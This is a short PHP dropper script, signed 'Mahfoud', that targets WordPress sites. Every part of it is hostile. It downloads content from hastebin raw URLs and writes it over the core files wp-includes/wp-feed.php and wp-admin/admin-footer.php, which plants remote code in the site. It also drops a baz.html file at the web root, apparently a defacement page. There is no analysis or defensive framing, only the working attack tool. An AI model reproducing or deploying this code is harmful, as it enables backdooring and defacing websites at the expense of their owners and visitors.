Mahfoud
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/wp-feed.php" ;
$text = http_get('https://hastebin.com/raw/wopurovopu');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done Mahfoud
.\n " ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/admin-footer.php" ;
$text2 = http_get('https://hastebin.com/raw/wopurovopu');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits2";
echo "done2 Mahfoud.\n " ;

$check3=$_SERVER['DOCUMENT_ROOT'] . "/baz.html" ;
$text3 = http_get('https://hastebin.com/raw/bitilunape');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);


?>
